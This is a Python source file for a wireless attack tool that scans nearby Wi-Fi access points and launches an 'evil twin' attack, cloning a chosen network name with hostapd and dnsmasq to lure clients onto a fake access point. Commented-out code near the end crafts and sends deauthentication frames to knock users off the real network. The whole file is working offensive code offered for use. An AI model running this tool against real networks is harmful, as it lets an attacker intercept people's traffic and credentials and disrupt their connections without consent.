import argparse as ap
import signal
import sys
import scapy.all as scapy
import subprocess
import pretty_lib as pl
import time
import ap_collector as apc
import os

BPF_BEACON = "type mgt && subtype beacon"
BPF_DATA = "type data && subtype qos-data && wlan ta "
BPF_EAPOL = "ether proto 0x888e"

AP_CONF_TEMPLATE = "apconf_template.conf"
AP_CONF = "apconf.conf"
DNSMASQ_CONF_TEMPLATE = "dnsmasq_template.conf"
DNSMASQ_CONF="dnsmasq.conf"

hostapd_proc = None
dnsmasq_proc = None
current_nic = None

def signal_handler(sig, frame):
    if (sig == signal.SIGINT):
        cleanup()
        sys.exit(-1)

def sp_error_handler(e):
    print(f"[!] Command failed during execution with return code {e.returncode}")
    print(f"    Command: {e.cmd}")
    print(f"    Output: {e.output}")
    sys.exit(-1)

def get_nics():
    nics = scapy.get_if_list()
    print(pl.UNDERLINE + "You can find below the available NICs:\n" + pl.ENDC)
    index = 1
    for el in nics:    
        print(pl.BOLD + str(index) + "- " + el + pl.ENDC)
        index+=1

def cleanup():
    if hostapd_proc:
        print("hostapd process found! Killing it ...")
        hostapd_proc.terminate()
    if dnsmasq_proc:
        print("dnsmasq process found! Killing it ...")
        dnsmasq_proc.terminate()
    set_nic_mode(current_nic, "managed")  
    try:
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", current_nic], check=True)
    except Exception as e:
        sp_error_handler(e)
    
    
def set_nic_mode(nic, flag):
    try:
        if flag == "monitor":
            print("Enabling monitor mode for the interface \"" + nic + "\" ...", end=" ")
            subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
            subprocess.run(["sudo", "iw", nic, "set", "type", "monitor"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
        elif flag == "managed":
            print("Disabling monitor mode for the interface \"" + nic + "\" ...", end=" ")
            subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
            subprocess.run(["sudo", "iw", nic, "set", "type", "managed"], check=True)
            subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
        else:
            return
        time.sleep(1)
        print(pl.BOLD + pl.GREEN + "done" + pl.ENDC)
    except Exception as e:
        sp_error_handler(e)

def set_nic_channel(nic, channel):
    print("Changing interface channel to -> " + str(channel), end="... ")
    try:
        subprocess.run(["sudo", "iw", "dev", nic, "set", "channel", str(channel)], check=True)
    except Exception as e:
        sp_error_handler(e)
    print(pl.BOLD + pl.GREEN + "done" + pl.ENDC)

def sniff_beacon_frame(nic, current_channel, ap_collector):
    done=False
    while not done:
        set_nic_channel(nic, current_channel)
        scapy.sniff(filter=BPF_BEACON, iface=nic, monitor=True, count=0, timeout=2, prn=beacon_frame_manager(ap_collector))
        current_channel+=1
        if current_channel == 13:
            done = True
            ap_collector.pprint()   

def beacon_frame_manager(ap_collector):
    def handle_beacon_frame(pkt):
        ssid="None"
        bssid="None"
        channel="None"
        chfreq="None"
        sigstren="None"
        drate="None"
        country="None"
        vendor="None"

        for payload in pkt.iterpayloads():
            if payload.name == "RadioTap":
                drate = payload.getfieldval("Rate")
                chfreq = payload.getfieldval("ChannelFrequency")
                sigstren = payload.getfieldval("dBm_AntSignal")
            elif payload.name == "802.11":
                bssid = payload.getfieldval("addr3")
            elif payload.name == "802.11 Information Element":
                if payload.getfieldval("ID") == 0:
                    ssid = payload.getfieldval("info").decode('utf-8')
            elif payload.name == "802.11 DSSS Parameter Set":
                channel=payload.getfieldval("channel")
            elif payload.name == "802.11 Country":
                country=payload.getfieldval("country_string").decode('utf-8')
            elif payload.name == "802.11 Vendor Specific":
                vendor=payload.getfieldval("oui")            

        ap_collector.update(ssid, bssid, channel, chfreq, sigstren, drate, country, vendor)

    return handle_beacon_frame

def data_frame_manager(stations):
    def handle_data_frame(pkt):
        for payload in pkt.iterpayloads():
            if payload.name == "802.11":
                station_mac = payload.getfieldval("addr1")
                break
        stations.append(station_mac)
    return handle_data_frame

def build_ap_conf(nic, ssid):
    with open(AP_CONF_TEMPLATE, "r") as f1, open(DNSMASQ_CONF_TEMPLATE, "r") as f2:
        ap_template = f1.read()
        ap_conf = (ap_template
            .replace("{{NIC}}", nic)
            .replace("{{SSID}}", ssid)
        )
        dnsmasq_template = f2.read()
        dnsmasq_conf = dnsmasq_template.replace("{{NIC}}", nic)
    with open(AP_CONF, "w") as f1, open(DNSMASQ_CONF, "w") as f2:
        f1.write(ap_conf)            
        f2.write(dnsmasq_conf)
 
def spawn_fake_ap(nic):
    global hostapd_proc, dnsmasq_proc
    try:
        hostapd_proc = subprocess.Popen(["sudo", "hostapd", AP_CONF],
            preexec_fn=os.setsid,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(1) # Initialize phase
        subprocess.run(["sudo", "ip", "link", "set", nic, "down"], check=True)
        subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24", "dev", nic], check=True)
        subprocess.run(["sudo", "ip", "link", "set", nic, "up"], check=True)
        dnsmasq_proc = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", "dnsmasq.conf"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        signal.pause()
    except Exception as e:
        sp_error_handler(e)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
 #   pl.print_banner()
    parser = ap.ArgumentParser(
        prog="apet",
        description="APAT retrieve the nearby available access points and provide the possibility to clone one of them.")
    parser.add_argument("-l", "--list", action="store_true", help="List available network interfaces.")
    parser.add_argument("-monm", "--monitor_mode", action="store_true", help="Put the specified interface in monitor mode.")
    parser.add_argument("-manm","--managed_mode", action="store_true", help="Put the specified interface in managed mode.")
    parser.add_argument("-i", "--interface", help="The network interface to use for the activities.")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan on multiple channel to retrieve the nearby access points.")
    parser.add_argument("-et", "--evil_twin", action="store_true", help="Execute the evil-twin attack")
    parser.add_argument("-ssid", "--ap_name", help="The SSID to use for the evil-twin attack.")
    args = parser.parse_args()
    
    if args.list:
        get_nics()
        sys.exit(1)

    if args.interface:
        current_nic = args.interface

    if args.monitor_mode and not args.interface:
        parser.error("The -monitor_mode option requires the -i option.")

    if args.managed_mode and not args.interface:
        parser.error("The --managed_mode option requires the -i option.")

    if args.scan and not args.interface:
        parser.error("The --scan option requires the -i option.")

    if args.evil_twin and not (args.interface and args.ap_name):
        parser.error("The --evil_twin option requires the options -i and -ssid.")
        
    if args.monitor_mode:
        set_nic_mode(args.interface, "monitor")
        sys.exit(1)

    if args.managed_mode:
        set_nic_mode(args.interface, "managed")
        sys.exit(1)

    if args.scan:
        set_nic_mode(args.interface, "monitor")
        current_channel = 1
        ap_collector = apc.AP_Collector()
        sniff_beacon_frame(args.interface, current_channel, ap_collector)

    if args.evil_twin:
        build_ap_conf(args.interface, args.ap_name)
        spawn_fake_ap(args.interface)

    # if args.get_stations:
    #     set_monitor_mode(args.interface, True)
    #     set_nic_channel(args.interface, args.ap_channel)
    #     stations = []
    #     scapy.sniff(filter=BPF_DATA + args.get_stations, iface=args.interface, monitor=True, count=0, timeout=10, prn=data_frame_manager(stations))
    #     print(list(set(stations)))
    #     set_monitor_mode(args.interface, False)

    # if args.deauth:
    #     set_monitor_mode(args.interface, True)
    #     set_nic_channel(args.interface, args.ap_channel)
    #     ap_mac = args.ap_mac
    #     st_mac = args.station_mac
    #     deauth_frame = scapy.RadioTap()/scapy.Dot11(addr1=st_mac, addr2=ap_mac, addr3=ap_mac)/scapy.Dot11Deauth(reason=3)
    #     scapy.sendp(x=deauth_frame, inter=0.1, iface=args.interface, count=10, verbose=False)
